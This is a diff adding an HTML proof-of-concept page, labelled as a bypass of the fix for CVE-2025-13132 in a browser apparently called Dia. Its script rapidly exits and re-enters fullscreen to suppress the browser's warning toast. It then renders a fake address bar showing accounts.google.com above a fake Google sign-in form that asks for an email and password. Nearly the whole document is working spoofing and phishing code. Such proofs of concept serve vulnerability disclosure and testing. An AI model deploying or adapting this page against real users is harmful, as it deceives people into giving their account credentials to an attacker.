@@ -1,0 +1,67 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>accounts.google.com</title>
+<style>
+ body{font-family:system-ui,Segoe UI,Arial;margin:0}
+ .wrap{margin:48px auto;max-width:680px;padding:0 20px}
+ .btn{font-size:15px;padding:14px 22px;border:0;border-radius:8px;background:#1a73e8;color:#fff;cursor:pointer}
+ .note{color:#666;font-size:13px;margin-top:14px;line-height:1.5}
+ /* fake browser chrome — shown when #fake itself is the fullscreen element (the rendering fix) */
+ #fake{position:fixed;inset:0;display:none;background:#fff;z-index:2147483647;flex-direction:column}
+ #fake:fullscreen,#fake:-webkit-full-screen{display:flex}
+ #fake .bar{background:#2b2d31;display:flex;align-items:center;gap:12px;padding:10px 16px}
+ #fake .dot{width:13px;height:13px;border-radius:50%}
+ #fake .addr{flex:1;background:#1e1f22;color:#e8eaed;border-radius:9px;padding:9px 18px;font-size:14px}
+ #fake .addr b{color:#8ab4f8}
+ #fake .page{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#202124}
+ #fake .gl{font-size:26px;color:#5f6368;margin-bottom:6px}
+ #fake input{width:360px;max-width:80vw;padding:13px;margin:7px;border:1px solid #dadce0;border-radius:7px;font-size:15px}
+ #fake .next{background:#1a73e8;color:#fff;border:0;padding:11px 26px;border-radius:7px;font-size:15px;float:right;margin-right:18%}
+</style></head>
+<body>
+<div class="wrap">
+ <h2>Newsletter — sign in to continue</h2>
+ <button class="btn" onclick="go()">Sign in with Google</button>
+ <p class="note"><b>PoC — CVE-2025-13132 fix bypass (Dia ≥1.6).</b> Clicking enters fullscreen via rapid
+   re-entry (fullscreen-toast dedup) and renders a fake Google sign-in occupying the whole screen.
+   If <b>no “ajaone.github.io … press Esc” toast</b> appears, the address bar is fully spoofed as
+   <code>accounts.google.com</code>. Press <b>Esc</b> to exit.</p>
+ <p class="note" id="st">status: —</p>
+</div>
+
+<div id="fake">
+ <div class="bar">
+   <span class="dot" style="background:#ff5f57"></span><span class="dot" style="background:#febc2e"></span><span class="dot" style="background:#28c840"></span>
+   <div class="addr">🔒 <b>accounts.google.com</b>/signin/v2/identifier?service=mail&amp;continue=https://mail.google.com</div>
+ </div>
+ <div class="page">
+   <div class="gl">Google</div><h2 style="font-weight:400;margin:4px 0">Sign in</h2>
+   <div style="color:#5f6368;margin-bottom:10px">Use your Google Account</div>
+   <input placeholder="Email or phone"><br><input type="password" placeholder="Enter your password"><br>
+   <button class="next">Next</button>
+ </div>
+</div>
+
+<script>
+const FAKE=document.getElementById('fake');
+function rfs(el){return el.requestFullscreen?el.requestFullscreen():el.webkitRequestFullscreen&&el.webkitRequestFullscreen();}
+function xfs(){return document.exitFullscreen?document.exitFullscreen():document.webkitExitFullscreen&&document.webkitExitFullscreen();}
+function st(m){document.getElementById('st').textContent='status: '+m;}
+document.addEventListener('fullscreenchange',function(){var e=document.fullscreenElement;
+  st(e?('FULLSCREEN — if no toast appeared, the address bar is spoofed as accounts.google.com'):'exited fullscreen');});
+
+// Bypass: enter fullscreen, immediately exit, then re-enter in a microtask.
+// The ≥1.6 toast is de-duplicated on the rapid 2nd entry → no toast → fake UI is the only chrome.
+function go(){
+  Promise.resolve(rfs(FAKE)).then(function(){
+    xfs();
+    Promise.resolve().then(function(){
+      Promise.resolve(rfs(FAKE)).catch(function(){
+        // fallback: re-enter on the next fullscreenchange (after exit)
+        var p=0; function h(){ if(!document.fullscreenElement&&p===0){p=1;document.removeEventListener('fullscreenchange',h);rfs(FAKE);} }
+        document.addEventListener('fullscreenchange',h);
+      });
+    });
+  }).catch(function(e){ st('requestFullscreen failed: '+e); });
+}
+</script>
+</body></html>
